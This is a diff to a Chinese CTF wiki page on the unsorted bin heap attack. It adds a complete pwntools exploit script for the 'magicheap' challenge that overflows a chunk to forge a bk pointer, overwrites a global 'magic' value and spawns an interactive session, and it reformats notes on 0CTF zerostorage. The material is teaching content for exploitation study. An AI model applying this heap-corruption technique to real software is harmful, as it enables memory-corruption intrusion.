@@ -1,5 +1,5 @@
 ---
-typora-root-url: ..\..
+typora-root-url: ../../../docs
 ---
 
 # Unsorted Bin Attack
@@ -221,7 +221,59 @@ magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 
 代码如下
 
+```Python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
 
+r = process('./magicheap')
+
+
+def create_heap(size, content):
+    r.recvuntil(":")
+    r.sendline("1")
+    r.recvuntil(":")
+    r.sendline(str(size))
+    r.recvuntil(":")
+    r.sendline(content)
+
+
+def edit_heap(idx, size, content):
+    r.recvuntil(":")
+    r.sendline("2")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+    r.recvuntil(":")
+    r.sendline(str(size))
+    r.recvuntil(":")
+    r.sendline(content)
+
+
+def del_heap(idx):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+
+create_heap(0x20, "dada")  # 0
+create_heap(0x80, "dada")  # 1
+# in order not to merge into top chunk
+create_heap(0x20, "dada")  # 2
+
+del_heap(1)
+
+magic = 0x6020c0
+fd = 0
+bk = magic - 0x10
+
+edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
+create_heap(0x80, "dada")  #trigger unsorted bin attack
+r.recvuntil(":")
+r.sendline("4869")
+r.interactive()
+
+```
 
 ## 2016 0CTF zerostorage-待完成
 
@@ -263,30 +315,30 @@ pwndbg> checksec
 
 基本功能如下
 
-1. 逐一查看 storage 数组，查找第一个未使用的元素，但是这个数组最大也就是32。
-2. 读取storage 元素所需要存储内容的长度。
-   - 如果长度不大于0，直接退出；
-   - 否则如果申请的字节数小于128，那就设置为128；
-   - 否则，如果申请的字节数不大于4096，那就设置为对应的数值；
-   - 否则，设置为4096。
-3. 使用 calloc 分配指定长度，注意 calloc 会初始化 chunk 为0。
-4. 将 calloc 分配的内存地址与 bss 段的一个内存（初始时刻为一个随机数）进行抑或，得到一个新的内存地址。
-5. 根据读取的storage的大小来读入内容。
-6. 将对应的storage的大小以及存储内容的地址保存到对应的storage 元素中，并标记该元素处于可用状态。**但是，需要注意的是，这里记录的storage的大小是自己输入的大小！！！**
-7. 递增 storage num的数量。
+1.  逐一查看 storage 数组，查找第一个未使用的元素，但是这个数组最大也就是32。
+2.  读取storage 元素所需要存储内容的长度。
+    -   如果长度不大于0，直接退出；
+    -   否则如果申请的字节数小于128，那就设置为128；
+    -   否则，如果申请的字节数不大于4096，那就设置为对应的数值；
+    -   否则，设置为4096。
+3.  使用 calloc 分配指定长度，注意 calloc 会初始化 chunk 为0。
+4.  将 calloc 分配的内存地址与 bss 段的一个内存（初始时刻为一个随机数）进行抑或，得到一个新的内存地址。
+5.  根据读取的storage的大小来读入内容。
+6.  将对应的storage的大小以及存储内容的地址保存到对应的storage 元素中，并标记该元素处于可用状态。**但是，需要注意的是，这里记录的storage的大小是自己输入的大小！！！**
+7.  递增 storage num的数量。
 
 #### update-2
 
-1. 如果没有任何存储，就直接返回。
-2. 读入要更新的storage元素的id，如果id大于31或者目前处于不处于使用状态，说明不对，直接返回。
-3. 读取**更新后**storage 元素所需要存储内容的长度。
-   - 如果长度不大于0，直接退出；
-   - 否则如果申请的字节数小于128，那就设置为128；
-   - 否则，如果申请的字节数不大于4096，那就设置为对应的数值；
-   - 否则，设置为4096。
-4. 根据 bss 段对应的随机数获取原先storage 存储内容的地址，
-5. 如果更新后所需的长度不等于更新前的长度，就使用realloc为其重新分配内存。
-6. 再次读取数据，同时更新storage 元素。
+1.  如果没有任何存储，就直接返回。
+2.  读入要更新的storage元素的id，如果id大于31或者目前处于不处于使用状态，说明不对，直接返回。
+3.  读取**更新后**storage 元素所需要存储内容的长度。
+    -   如果长度不大于0，直接退出；
+    -   否则如果申请的字节数小于128，那就设置为128；
+    -   否则，如果申请的字节数不大于4096，那就设置为对应的数值；
+    -   否则，设置为4096。
+4.  根据 bss 段对应的随机数获取原先storage 存储内容的地址，
+5.  如果更新后所需的长度不等于更新前的长度，就使用realloc为其重新分配内存。
+6.  再次读取数据，同时更新storage 元素。
 
 #### merge-3
 
